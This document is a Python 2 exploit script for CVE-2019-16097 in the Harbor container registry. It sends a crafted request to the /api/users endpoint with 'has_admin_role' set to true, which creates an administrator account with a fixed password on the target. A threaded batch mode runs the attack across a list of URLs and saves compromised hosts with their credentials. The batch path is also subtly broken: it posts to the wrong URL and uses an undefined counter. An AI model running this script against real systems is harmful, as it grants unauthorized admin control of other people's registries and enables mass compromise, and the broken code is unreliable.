# coding:utf-8
# Author:LSA
# Description:harbor add admin(cve-2019-16097)
# Date:20191002


import requests
import threading
import Queue
import urllib3
import optparse
import sys
import datetime
import os

reload(sys)
sys.setdefaultencoding('utf-8')

lock = threading.Lock()
q0 = Queue.Queue()
threadList = []
global success_count
success_count = 0


total_count = 0

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
    'Content-Type': 'application/json',
}

payload = '{"username":"test00","email":"test00@qq.com","realname":"test00","password":"Test00@123","comment":"test00","has_admin_role":true}'


def harborAddAdmin(tgtUrl,timeout):
    requests.packages.urllib3.disable_warnings()

    fullUrl = tgtUrl + '/api/users'


    try:
        rsp = requests.post(fullUrl, headers=headers, data=payload, timeout=7, verify=False)
        if rsp.status_code == 201:
            print tgtUrl + ' is vulnerable!!! username:test00|password:Test00@123' + '\n'
        else:
            print 'Exploited failed!status_code:' + str(rsp.status_code)
    except Exception as e:
        print 'Exploited failed!'
        print e


def harborAddAdminBatch(f4success,timeout):
    urllib3.disable_warnings()
    global total_count
    while (not q0.empty()):

        tgtUrl = q0.get()
        fullUrl = tgtUrl + '/api/users'
        qcount = q0.qsize()
        print 'Checking: ' + tgtUrl + ' ---[' + str(total_count - qcount) + '/' + str(total_count) + ']'

        try:
            rst = requests.post(tgtUrl, headers=headers, data=payload, timeout=timeout, verify=False)

        except requests.exceptions.Timeout:
            continue

        except requests.exceptions.ConnectionError:
            continue
        except:
            continue

        if rst.status_code == 201:

            lock.acquire()
            print tgtUrl + ' is vulnerable!!! username:test00|password:Test00@123' + '\n'
            f4success.write('Target is vulnerable!!!---' + fullUrl + '[username:test00|password:Test00@123]' + '\n')
            lock.release()
            global succ
            succ = succ + 1

        else:
            continue


if __name__ == '__main__':
    parser = optparse.OptionParser('python %prog ' + '-h', version='%prog v1.0')

    parser.add_option('-u', dest='tgtUrl', type='string', help='single target url')
    parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')

    parser.add_option('-f', dest='tgtUrlsPath', type='string', help='urls filepath')
    parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')

    (options, args) = parser.parse_args()

    timeout = options.timeout
    tgtUrl = options.tgtUrl

    if tgtUrl and (options.tgtUrlsPath is None):
        harborAddAdmin(tgtUrl, timeout)

    if options.tgtUrlsPath:
        tgtFilePath = options.tgtUrlsPath
        threads = options.threads
        nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
        os.mkdir('batch_result/' + str(nowtime))
        f4success = open('batch_result/' + str(nowtime) + '/' + 'success-checked.txt', 'w')
        #f4fail = open('batch_result/' + str(nowtime) + '/' + 'failed-checked.txt', 'w')
        urlsFile = open(tgtFilePath)

        total_count = len(open(tgtFilePath, 'rU').readlines())

        print '===Total ' + str(total_count) + ' urls==='

        for urls in urlsFile:
            tgtUrls = urls.strip()
            q0.put(tgtUrls)
        for thread in range(threads):
            t = threading.Thread(target=harborAddAdminBatch, args=(f4success,timeout))
            t.start()
            threadList.append(t)
        for th in threadList:
            th.join()

        print '\n###Finished! [success/total]: ' + '[' + str(success_count) + '/' + str(total_count) + ']###'
        print 'Results were saved in ./batch_result/' + str(nowtime) + '/'
        f4success.close()
        f4fail.close()



